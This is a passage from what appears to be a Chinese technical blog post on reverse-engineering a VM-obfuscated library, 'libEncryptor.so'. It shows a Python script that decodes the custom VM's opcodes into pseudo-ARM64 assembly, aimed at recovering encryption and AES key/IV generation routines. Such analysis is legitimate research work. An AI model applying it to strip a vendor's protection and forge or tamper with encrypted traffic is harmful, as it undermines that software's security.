rgb(255, 115, 253);">12</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">8</span><br />op1: <span style="color: rgb(255, 115, 253);">11</span><span style="color: rgb(168, 255, 96);">,</span> op2: <span style="color: rgb(255, 115, 253);">25</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">2</span><br />op1: <span style="color: rgb(255, 115, 253);">11</span><span style="color: rgb(168, 255, 96);">,</span> op2: <span style="color: rgb(255, 115, 253);">39</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">1</span><br />op1: <span style="color: rgb(255, 115, 253);">11</span><span style="color: rgb(168, 255, 96);">,</span> op2: <span style="color: rgb(255, 115, 253);">62</span><span style="color: rgb(168, 255, 96);">,</span> count: <span style="color: rgb(255, 115, 253);">1</span></code></pre><h2>还原脚本</h2><p>在15个handler并还原后，现在重新编写脚本<code style="font-family: SFMono-Regular, Consolas, ;">decode_opcode.py</code>解码opcode，将打印还原的指令打印出伪汇编代码并保存文件<code style="font-family: SFMono-Regular, Consolas, ;">ttencryptor.asm</code>和<code style="font-family: SFMono-Regular, Consolas, ;">generate_aes_key_iv.asm</code>。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><code style="font-family: SFMono-Regular, Consolas, ;">        <span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">decode</span>(pcode_start, pcode_size, liner_disasm = <span style="color: rgb(198, 197, 254);">False</span>):<br />                <span style="color: rgb(150, 203, 254);">with</span> open(<span style="color: rgb(168, 255, 96);">"libEncryptor.so"</span>, <span style="color: rgb(168, 255, 96);">"rb"</span>) <span style="color: rgb(150, 203, 254);">as</span> f:                        content = f.read()<br />                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'pc'</span>:^<span style="color: rgb(255, 115, 253);">8</span>}</span> <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'指令'</span>:^<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'op1'</span>:^<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'op2'</span>:^<span style="color: rgb(255, 115, 253);">8</span>}</span>\t<span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'助记符'</span>:^<span style="color: rgb(255, 115, 253);">30</span>}</span>"</span>)<br />                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  MOV\tx0, #0\t\t\t;x0始终为0，XZR寄存器?"</span>)<br />                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  MOV\tx4, pArgs\t\t;参数列表指针"</span>)<br />                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  MOV\tx5, #0"</span>)<br />                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  MOV\tx6, pfn_external_func_list\t\t;外部函数列表指针"</span>)<br />                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  MOV\tx7, pCallRegisterTrampolineFunction\t;保存跳转函数地址"</span>)<br />                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  MOV\tx29, pVirualStackBottom;\t\t;虚拟机堆栈栈底"</span>)<br />                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  MOV\tlr, #0\t\t\t;x31=0"</span>)<br />                <span style="color: rgb(146, 255, 184);"># 已解析的指令</span><br />                known_insns_op1 = {}        <span style="color: rgb(146, 255, 184);"># dcode_insns_status=1</span><br />                known_insns_op2 = {}        <span style="color: rgb(146, 255, 184);"># dcode_insns_status=2</span><br />                <span style="color: rgb(146, 255, 184);"># 未解析的指令</span><br />                unknown_insts_op1 = set()   <span style="color: rgb(146, 255, 184);"># dcode_insns_status=3</span><br />                unknown_insts_op2 = set()   <span style="color: rgb(146, 255, 184);"># dcode_insns_status=4</span>                bytes_code = content[pcode_start : pcode_start + pcode_size]<br />                <span style="color: rgb(150, 203, 254);">for</span> pc <span style="color: rgb(150, 203, 254);">in</span> range(<span style="color: rgb(255, 115, 253);">0</span>, pcode_size, <span style="color: rgb(255, 115, 253);">4</span>):<br />                        word = struct.unpack(<span style="color: rgb(168, 255, 96);">"&lt;I"</span>, bytes_code[pc : pc + <span style="color: rgb(255, 115, 253);">4</span>])  <br />                        asm = <span style="color: rgb(168, 255, 96);">""</span>         <br />                        dcode_insns_status = <span style="color: rgb(255, 115, 253);">0</span><br />                        <span style="color: rgb(150, 203, 254);">if</span> len(word) &gt; <span style="color: rgb(255, 115, 253);">0</span>:<br />                                opcode = word[<span style="color: rgb(255, 115, 253);">0</span>]                                            op1 = get_op1(opcode)<br />                                Xt = get_openand1(opcode)   <span style="color: rgb(146, 255, 184);"># x8/w8</span><br />                                Xn = get_operand2(opcode)   <span style="color: rgb(146, 255, 184);"># x9/w9    </span><br />                                Xm = get_operand3(opcode)   <span style="color: rgb(146, 255, 184);"># x10/w10</span><br />                                X4 = get_operand4(opcode)   <span style="color: rgb(146, 255, 184);"># x11/w11</span><br />                                <span style="color: rgb(150, 203, 254);">match</span> op1:<br />                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">11</span>:<br />                                                Xt = get_operand3(opcode)   <span style="color: rgb(146, 255, 184);"># x10/w10</span><br />                                                Xn = get_openand1(opcode)   <span style="color: rgb(146, 255, 184);"># x8/w8</span><br />                                                Xm = get_operand2(opcode)   <span style="color: rgb(146, 255, 184);"># x9/w9                 </span>                                                op2 = get_op2(opcode)                    <br />                                                <span style="color: rgb(150, 203, 254);">match</span> op2:<br />                                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">7</span>:<br />                                                                dcode_insns_status=<span style="color: rgb(255, 115, 253);">2</span><br />                                                                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{op2:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{op2:02X}</span>)\tORR\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xm)}</span>"</span>)<br />                                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">12</span>:<br />                                                                dcode_insns_status=<span style="color: rgb(255, 115, 253);">2</span><br />                                                                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{op2:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{op2:02X}</span>)\tADD\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xm)}</span>"</span>)<br />                                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">25</span>:<br />                                                                dcode_insns_status=<span style="color: rgb(255, 115, 253);">2</span><br />                                                                <span style="color: rgb(150, 203, 254);">if</span> X4 == <span style="color: rgb(255, 115, 253);">0</span>:<br />                                                                        print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{op2:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{op2:02X}</span>)\tNOP\t\t\t\t;LSL\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>, #<span style="color: rgb(218, 239, 163);">{X4}</span>"</span>)<br />                                                                <span style="color: rgb(150, 203, 254);">else</span>:<br />                                                                        print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{op2:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{op2:02X}</span>)\tLSL)\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>, #<span style="color: rgb(218, 239, 163);">{X4}</span>"</span>)<br />                                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">39</span>:<br />                                                                dcode_insns_status=<span style="color: rgb(255, 115, 253);">2</span><br />                                                                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{op2:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{op2:02X}</span>)\tCMP\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xm)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>"</span>)<br />                                                                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">' '</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">' '</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{op2:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{op2:02X}</span>)\tCSET\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, CC"</span>)<br />                                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">43</span>:<br />                                                                dcode_insns_status=<span style="color: rgb(255, 115, 253);">2</span><br />                                                                <span style="color: rgb(150, 203, 254);">if</span> liner_disasm:<br />                                                                        print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{op2:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{op2:02X}</span>)\tBR\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xm)}</span>\t\t\t;LR=<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>"</span>)<br />                                                                <span style="color: rgb(150, 203, 254);">else</span>:<br />                                                                        asm = <span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{op2:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{op2:02X}</span>)\tBR\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xm)}</span>\t\t\t;LR=<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>"</span>                                                                        set_branch_control(asm)<br />                                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">62</span>:<br />                                                                dcode_insns_status=<span style="color: rgb(255, 115, 253);">2</span><br />                                                                <span style="color: rgb(150, 203, 254);">if</span> liner_disasm:<br />                                                                        print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{op2:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{op2:02X}</span>)\tExitVm\t0\t\t\t;<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xm)}</span>"</span>)<br />                                                                <span style="color: rgb(150, 203, 254);">else</span>:<br />                                                                        asm = <span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{op2:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{op2:02X}</span>)\tExitVm\t0\t\t\t;<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xm)}</span>"</span>                                                                        set_branch_control(asm)<br />                                                        <span style="color: rgb(150, 203, 254);">case</span> _:<br />                                                                dcode_insns_status=<span style="color: rgb(255, 115, 253);">4</span><br />                                                                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{op2:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{op2:02X}</span>)\t&gt;&gt; op2_xxx\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xm)}</span>"</span>)<br />                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">7</span>:<br />                                                dcode_insns_status = <span style="color: rgb(255, 115, 253);">1</span>                                                imm16 = get_imm16(opcode)<br />                                                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>\tORR\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>, #<span style="color: rgb(218, 239, 163);">{hex(imm16)}</span>"</span>)<br />                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">12</span>:<br />                                                dcode_insns_status = <span style="color: rgb(255, 115, 253);">1</span>                                                imm26 = get_imm26(opcode)<br />                                                offset = imm26 * <span style="color: rgb(255, 115, 253);">4</span><br />                                                <span style="color: rgb(150, 203, 254);">if</span> liner_disasm:<br />                                                        print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>\tB\t<span style="color: rgb(218, 239, 163);">{hex(offset)}</span>"</span>)<br />                                                <span style="color: rgb(150, 203, 254);">else</span>:<br />                                                        asm = <span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>\tB\t<span style="color: rgb(218, 239, 163);">{hex(offset)}</span>"</span>                                                        set_branch_control(asm)<br />                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">17</span>:<br />                                                dcode_insns_status = <span style="color: rgb(255, 115, 253);">1</span>                                                imm16 = get_imm16(opcode)<br />                                                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>\tADD\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>, #<span style="color: rgb(218, 239, 163);">{hex(imm16)}</span>"</span>)<br />                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">21</span>:<br />                                                dcode_insns_status = <span style="color: rgb(255, 115, 253);">1</span>                                                imm16 = get_imm16(opcode)<br />                                                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>\tADD\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>, #<span style="color: rgb(218, 239, 163);">{hex(imm16)}</span>"</span>)<br />                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">23</span>:<br />                                                dcode_insns_status = <span style="color: rgb(255, 115, 253);">1</span>                                                imm16 = get_imm16(opcode)<br />                                                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>\tSTR\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, [<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>, #<span style="color: rgb(218, 239, 163);">{hex(imm16)}</span>]"</span>)<br />                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">24</span>:<br />                                                dcode_insns_status = <span style="color: rgb(255, 115, 253);">1</span>                                                imm16 = get_imm16(opcode)<br />                                                offset = pc + imm16 * <span style="color: rgb(255, 115, 253);">4</span> + <span style="color: rgb(255, 115, 253);">4</span><br />                                                <span style="color: rgb(150, 203, 254);">if</span> liner_disasm:<br />                                                        print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>\tB.HS\t#<span style="color: rgb(218, 239, 163);">{hex(offset)}</span>\t\t\t;<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>, $<span style="color: rgb(218, 239, 163);">{hex(imm16 * <span style="color: rgb(255, 115, 253);">4</span>)}</span>"</span>)<br />                                                <span style="color: rgb(150, 203, 254);">else</span>:<br />                                                        asm = <span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>\tB.HS\t#<span style="color: rgb(218, 239, 163);">{hex(offset)}</span>\t\t\t;<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, <span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>, $<span style="color: rgb(218, 239, 163);">{hex(imm16 * <span style="color: rgb(255, 115, 253);">4</span>)}</span>"</span>                                                        set_branch_control(asm)<br />                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">40</span>:<br />                                                dcode_insns_status = <span style="color: rgb(255, 115, 253);">1</span>                                                imm16 = get_imm16(opcode)<br />                                                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02d}</span>(0x<span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: rgb(255, 115, 253);">0x3F</span>:02X}</span>)  <span style="color: rgb(218, 239, 163);">{<span style="color: rgb(168, 255, 96);">'-'</span>*<span style="color: rgb(255, 115, 253);">8</span>}</span>\tLDR\t<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xt)}</span>, [<span style="color: rgb(218, 239, 163);">{get_regsiter_name(Xn)}</span>, #<span style="color: rgb(218, 239, 163);">{hex(imm16)}</span>]"</span>)<br />                                        <span style="color: rgb(150, 203, 254);">case</span> <span style="color: rgb(255, 115, 253);">48</span>:<br />                                                dcode_insns_status = <span style="color: rgb(255, 115, 253);">1</span>                                                imm16 = get_imm16(opcode)<br />                                                print(<span style="color: rgb(168, 255, 96);">f"<span style="color: rgb(218, 239, 163);">{pc:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode:08X}</span>  <span style="color: rgb(218, 239, 163);">{opcode &amp; <span style="color: 